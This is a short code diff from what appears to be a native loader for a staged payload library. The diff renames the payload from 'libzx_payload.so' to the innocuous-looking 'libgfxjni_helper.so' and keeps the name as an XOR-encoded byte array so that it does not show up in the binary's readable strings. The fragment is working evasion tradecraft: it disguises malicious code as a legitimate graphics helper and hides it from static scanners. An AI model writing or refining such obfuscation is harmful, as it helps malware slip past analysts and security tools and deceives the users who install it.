@@ -64,13 +64,13 @@ typedef int (*phdr_cb_t)(struct dl_phdr_info *, size_t, void *);
 #endif
 
 // ─────────────────────────────────────────────────────────────────────────────
-// Payload library name (compile-time XOR so it never appears in .rodata)
+// Staged payload name (compile-time XOR so it never appears in .rodata)
 // XOR key 0x5A. Decode: each byte ^ 0x5A
-// "libzx_payload.so" XOR 0x5A
+// "libgfxjni_helper.so" XOR 0x5A
 // ─────────────────────────────────────────────────────────────────────────────
 static const uint8_t k_payload_xored[] = {
-    // l     i     b     z     x     _     p     a     y     l     o     a     d     .     s     o
-    0x36, 0x33, 0x38, 0x20, 0x22, 0x05, 0x2A, 0x3B, 0x23, 0x36, 0x35, 0x3B, 0x3E, 0x74, 0x29, 0x35, 0x00
+    // l     i     b     g     f     x     j     n     i     _     h     e     l     p     e     r     .     s     o
+    0x36, 0x33, 0x38, 0x3D, 0x3C, 0x22, 0x30, 0x34, 0x33, 0x05, 0x32, 0x3F, 0x36, 0x2A, 0x3F, 0x28, 0x74, 0x29, 0x35, 0x00
 };
 
 static char s_payload_name[32] = {};
